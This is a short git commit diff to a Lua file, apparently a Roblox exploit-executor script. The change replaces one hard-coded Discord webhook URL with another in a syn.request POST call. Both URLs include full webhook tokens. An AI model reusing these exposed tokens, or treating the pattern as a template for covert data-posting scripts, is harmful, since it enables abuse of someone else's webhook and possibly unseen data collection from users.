4582ed9caad39ae5736ddda557fcc1f12a4f08bc
WeshkyB <therealsxirbes@gmail.com>
2024-11-16 01:43:31 +0100

    Update Tu.lua

--- Tu.lua
+++ Tu.lua
@@ -1,5 +1,5 @@
 local response = syn.request({
-    Url = 'https://discord.com/api/webhooks/1302125178381406289/rQVnFy43mDY6ALBbscSUUvcwAFmV_AoHEFIns8_GH4oYJFKvSx3srfRxGO-hOFx_diDj',  -- Replace with your Discord webhook URL
+    Url = 'https://discord.com/api/webhooks/1307143881560817756/Nvu6XQBBZJrRxx9vOtGPxZyyGsk_3d0DgHUdRCKGNxTdDllkpES1hgTB5MldYiUZCKqr',  -- Replace with your Discord webhook URL
     Method = 'POST',
     Headers = {
         ['Content-Type'] = 'application/json'  -- Specifies the content type
